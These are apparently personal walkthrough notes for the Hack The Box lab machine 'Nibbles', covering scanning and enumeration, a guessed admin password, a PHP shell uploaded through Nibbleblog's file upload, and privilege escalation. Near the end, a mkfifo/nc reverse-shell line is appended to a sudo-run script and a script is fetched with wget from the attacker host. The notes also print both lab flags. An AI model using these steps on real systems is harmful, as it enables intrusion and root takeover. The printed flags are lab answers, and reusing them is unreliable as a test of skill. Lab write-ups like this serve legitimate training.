#Nibbles #HTB

IP 10.129.200.170
nmap -sV --open -oA nibbles_initial_scan 10.129.200.170
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

nmap -p- --open -oA nibbles_full_tcp_scan 10.129.200.170
	22/tcp open  ssh
	80/tcp open  http
	
nc -nv 10.129.200.170 80 # no banner

nmap -sC -p 22,80 -oA nibbles_script_scan  10.129.200.170
	PORT   STATE SERVICE
	22/tcp open  ssh
	| ssh-hostkey: 
	|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
	|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
	|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
	80/tcp open  http
	|_http-title: Site doesn't have a title (text/html).

nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.200.170

whatweb 10.129.200.170
	http://10.129.200.170 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170]
Browse to IP find source code 
or
curl 10.129.200.170
	<!-- /nibbleblog/ directory. Nothing interesting here! -->

whatweb http://10.129.200.170/nibbleblog
	http://10.129.200.170/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170], RedirectLocation[http://10.129.200.170/nibbleblog/], Title[301 Moved Permanently]
	http://10.129.200.170/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]

Vuln search for nibbleblog
	[Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) - PHP remote Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/38489)
		explit shows it targets /admin.php - which is found

gobuster dir -u http://10.129.200.170/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
	/.hta                 (Status: 403) [Size: 304]
	/.htaccess            (Status: 403) [Size: 309]
	/.htpasswd            (Status: 403) [Size: 309]
	/admin                (Status: 301) [Size: 327] [--> http://10.129.200.170/nibbleblog/admin/]
	/admin.php            (Status: 200) [Size: 1401]
	/content              (Status: 301) [Size: 329] [--> http://10.129.200.170/nibbleblog/content/]
	/index.php            (Status: 200) [Size: 2987]
	/languages            (Status: 301) [Size: 331] [--> http://10.129.200.170/nibbleblog/languages/]
	/plugins              (Status: 301) [Size: 329] [--> http://10.129.200.170/nibbleblog/plugins/]
	/README               (Status: 200) [Size: 4628]
	/themes               (Status: 301) [Size: 328] [--> http://10.129.200.170/nibbleblog/themes/]

curl http://10.129.200.170/nibbleblog/README - version is 4.0.3 which matches found vuln 

Attempt a few common admin creds in /admin.php

look at directories gobuster found
check out various files for goodies

curl -s http://10.129.200.170/nibbleblog/content/private/users.xml | xmllint  --format -
	shows user name admin

Guessing the admin is lazy try nibbles as pass
	admin:nibbles - working creds

Enumerate all the links, pages, and user input fields for something to attack
	found file upload feature
		upload a php shell file for reverse connection
		track down location of file
Found http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
	loads commands from shell
	
nc -lvnp 9001 then browse to previously uploaded shell or http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php 

python3 -c 'import pty; pty.spawn("/bin/bash")'
cd ~ then cat user flag 79c03865431abf47b90ef24b9695e148

unzip personal.txt find a monitor.sh script

xfer over linenum
	python http server
	wget http://10.10.14.166:8001/linenum.sh
run linenum.sh

sudo -l see what nibbler can run and see its the monitor script
bak monitor
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.166 9002 >/tmp/f' | tee -a monitor.sh

sudo /home/nibbler/personal/stuff/monitor.sh and we have root
de5e5d6619862a8aa5b9b212314e0cdd